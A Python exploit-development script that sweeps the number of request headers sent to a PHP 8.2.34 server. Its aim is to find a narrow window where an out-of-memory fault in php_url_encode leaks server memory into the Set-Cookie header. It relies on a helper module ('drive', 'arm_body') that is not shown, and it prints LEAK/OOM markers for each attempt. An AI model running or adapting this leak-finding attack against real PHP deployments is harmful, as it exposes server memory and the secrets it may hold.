#!/usr/bin/env python3
"""Fine sweep: find the narrow leak window on 8.2.34 (OOM inside php_url_encode)."""
import sys, time
sys.path.insert(0, r"C:\Users\likat\p2s52704\php72")
import drive as D

PORT = 18111

def try_n(nheaders):
    try:
        c = D.Conn("127.0.0.1", PORT, False)
        c.get("/"); c.close()
    except Exception: pass
    time.sleep(0.3)
    body = D.arm_body(nheaders, b"a:\n", b"\x00")
    try:
        c = D.Conn("127.0.0.1", PORT, False)
        r = c.post("/index.php", body, False, maxread=8<<20)
        sc = r.get("headers", {}).get("set-cookie", "")
        clen = len(sc)
        c.close()
    except Exception as e:
        clen = -1
    return clen

# Coarse: 400k-600k step 10k to find transition
print("=== Coarse sweep (400k-600k, step 10k) ===")
for n in range(400000, 600001, 10000):
    clen = try_n(n)
    mark = "  <-- LEAK!" if clen > 200 else ("  [no-OOM]" if clen == 50 else "  [OOM]")
    print(f"n={n:>8}  cookie={clen:>6}{mark}")

# Fine: around the transition (step 5)
print("\n=== Fine sweep (around transition, step 5) ===")
for n in range(490000, 520001, 5):
    clen = try_n(n)
    mark = "  <-- LEAK!" if clen > 200 else ("  [no-OOM]" if clen == 50 else "  [OOM]")
    print(f"n={n:>8}  cookie={clen:>6}{mark}")
    if clen > 200:
        print(f"*** FOUND LEAK WINDOW at n={n} ***")
        break
